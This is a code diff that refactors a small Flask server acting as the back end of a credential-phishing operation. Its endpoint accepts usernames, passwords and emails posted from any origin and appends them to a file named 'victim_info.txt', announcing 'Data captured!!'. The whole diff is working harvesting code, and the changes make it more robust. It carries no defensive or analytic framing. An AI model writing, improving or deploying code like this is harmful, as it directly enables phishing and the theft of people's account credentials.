@@ -1,34 +1,33 @@
+from pathlib import Path
+
 from flask import Flask, request, jsonify
 from flask_cors import CORS
-import json
 
 app = Flask(__name__)
-
 CORS(app)
+
+DATA_FILE = Path(__file__).parent / "victim_info.txt"
 
 
 @app.route('/savefile', methods=['POST'])
 def save_file():
+    data = request.get_json(silent=True) or {}
 
-    try:
-        data = request.get_json()
-        username = data['username']
-        password = data['password']
-        if "email" in data:
-            email = data['email']
-        else:
-            email=''
-        # jsonData = {"":username, "password": password}
-        with open("./victim_info.txt", "a+") as file:
-            #json.dump(data, file)
-            file.write(f'{username}, {email}, {password}\n')
+    user = data.get('username')
+    password = data.get('password')
+    email = data.get('email', "")
 
-        print("Data captured!!")
+    if not user or not password:
+        return jsonify(status="Error", message="Username and password are required"), 400
 
-        return jsonify(200)
+    DATA_FILE.parent.mkdir(parents=True, exist_ok=True)
+    with DATA_FILE.open("a+") as file:
+        file.write(f'{user}, {password}, {email}\n')
 
-    except Exception as e:
-        print(f"Error capturing data. Error: {e}")
+    print("Data captured!!")
+
+    return jsonify(status="OK"), 200
+
 
 if __name__ == '__main__':
     app.run(host="localhost", port=2400, debug=True)
